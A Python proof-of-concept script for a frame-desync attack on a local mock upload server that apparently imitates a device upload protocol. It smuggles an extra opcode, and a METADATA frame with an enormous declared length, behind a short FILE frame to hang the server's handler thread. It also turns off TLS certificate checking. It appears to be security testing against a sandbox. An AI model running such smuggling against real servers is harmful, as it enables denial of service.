#!/usr/bin/env python3
"""Frame-desync attack against the Flock mock upload server (upload_server.py).

IDEA UNDER TEST (protocol-sourced): send a framed op (FILE, opcode 6) with a
SMALL declared length (e.g. 1) but push MORE bytes than that in the very same
TCP write/segment. The server's FILE handler is written as a strict counted
read:

    total = read_len(conn)
    remaining = total
    while remaining > 0:
        chunk = conn.recv(min(args.chunk, remaining))
        ...
        remaining -= len(chunk)

It only ever asks recv() for up to `remaining` bytes, so once `total` bytes
have been accounted for it stops touching the socket for this op -- any extra
bytes we appended stay sitting in the kernel's receive buffer / the next
recv() call. The very next thing the connection handler does is:

    op_b = conn.recv(1)   # top of the while True loop

which will hand back the leftover bytes as if they were a *fresh opcode byte*
followed by a fresh frame. This script proves that leakage two ways:

  1. "phantom-opcode" case: after the short FILE body, append a single
     unused/unknown opcode byte (200). If desync occurs, the server logs an
     "unknown opcode 200" line and ACKs it -- an operation the client never
     intended to send as a discrete frame, smuggled in as trailing bytes of
     a different frame's declared body.

  2. "smuggled-giant-length" case: after the short FILE body, append a
     complete METADATA (12) opcode byte plus an 8-byte length field claiming
     an enormous size (2**40), but *no* payload bytes to back it. If the
     server treats this as a genuine new METADATA frame (proving desync),
     it will block forever inside recvn() waiting for gigabytes of metadata
     that will never arrive -- a per-connection thread hang / resource
     exhaustion, triggered by a completely well-formed-looking short FILE
     upload with a booby-trapped tail.

Both cases are pure protocol-parsing attacks against our own local sandbox
mock (127.0.0.1 only). No real device, backend, or captured data involved.
"""
import argparse
import json
import socket
import ssl
import struct
import sys
import time

OK, HELLO, PROTO, SESSION, START, FILE, HASH, SAVE, COMPLETE, METADATA = (
    1, 2, 3, 4, 5, 6, 7, 8, 9, 12,
)


def connect(host, port, tls):
    s = socket.create_connection((host, port), timeout=10)
    if tls:
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def be_long(n):
    return struct.pack(">q", n)


def recvn(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError("closed")
        b += c
    return b


def hello(s, token="SANDBOX-FAKE-TOKEN"):
    payload = json.dumps(
        {"authToken": token, "serial": "MOCK-000000", "clientVersion": "sandbox"}
    ).encode()
    s.sendall(bytes([HELLO]))
    s.sendall(bytes([3]))
    s.sendall(be_long(len(payload)))
    s.sendall(payload)
    n = struct.unpack(">q", recvn(s, 8))[0]
    resp = recvn(s, n)
    s.sendall(bytes([OK]))
    return resp.decode("utf-8", "replace")


def drain(s, label, timeout=2.0, maxlen=64):
    """Read whatever the server sends back right now, non-blocking-ish."""
    s.settimeout(timeout)
    try:
        data = s.recv(maxlen)
        print(f"[{label}] server -> {data!r}")
        return data
    except socket.timeout:
        print(f"[{label}] server -> <TIMEOUT after {timeout}s, no response: HANG>")
        return None
    except Exception as e:
        print(f"[{label}] server -> <{type(e).__name__}: {e}>")
        return None
    finally:
        s.settimeout(10)


def case_phantom_opcode(host, port, tls):
    """Short FILE(len=1) + real 1-byte body + one extra 'phantom' opcode byte,
    all in a single sendall() so they land in the same TCP segment(s)."""
    print("\n=== case 1: phantom-opcode (truncated FILE length + trailing byte) ===")
    s = connect(host, port, tls)
    hello(s)
    for op in (SESSION, START):
        s.sendall(bytes([op]))
        recvn(s, 1)

    PHANTOM_OPCODE = 200  # unused by the protocol -> unambiguous marker if it leaks through
    body = b"A"  # the *real*, fully-declared FILE content: exactly 1 byte
    frame = bytes([FILE]) + be_long(len(body)) + body + bytes([PHANTOM_OPCODE])
    print(f"sending single write: opcode=FILE len={len(body)} body={body!r} + trailing byte {PHANTOM_OPCODE}")
    s.sendall(frame)

    # Expect: 1 OK ack for the FILE op we actually declared.
    r1 = drain(s, "ack-for-declared-FILE")
    # If desync happened, the leftover phantom byte is now sitting at the front
    # of the socket and gets read as the *next* opcode -> server should emit a
    # SECOND response (its generic "unknown opcode -> OK" fallback) that we
    # never explicitly asked for.
    r2 = drain(s, "SECOND-unsolicited-response (proves desync if present)")
    s.close()
    return r1, r2


def case_smuggled_giant_length(host, port, tls):
    """Short FILE(len=1) + real 1-byte body + a fully-formed METADATA opcode
    with an astronomically large declared length and NO payload bytes behind
    it. If the server desyncs and starts a genuine new METADATA read, its
    recvn() blocks forever -> the connection handler thread hangs."""
    print("\n=== case 2: smuggled giant-length METADATA frame via FILE truncation ===")
    s = connect(host, port, tls)
    hello(s)
    for op in (SESSION, START):
        s.sendall(bytes([op]))
        recvn(s, 1)

    body = b"A"
    huge_len = 2 ** 40  # 1 TiB, we will never actually send this much
    smuggled = bytes([METADATA]) + be_long(huge_len)  # opcode + 8-byte length, NO data after
    frame = bytes([FILE]) + be_long(len(body)) + body + smuggled
    print(f"sending single write: opcode=FILE len={len(body)} body={body!r} "
          f"+ smuggled METADATA opcode + length={huge_len} (0 payload bytes sent)")
    s.sendall(frame)

    r1 = drain(s, "ack-for-declared-FILE")
    print("now waiting up to 5s to see if server hangs reading the smuggled METADATA length...")
    r2 = drain(s, "response-to-smuggled-METADATA (should HANG if desync occurred)", timeout=5.0)
    s.close()
    return r1, r2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--plaintext", action="store_true")
    a = ap.parse_args()
    tls = not a.plaintext

    t0 = time.time()
    case_phantom_opcode(a.host, a.port, tls)
    case_smuggled_giant_length(a.host, a.port, tls)
    print(f"\ndone in {time.time() - t0:.2f}s")


if __name__ == "__main__":
    main()
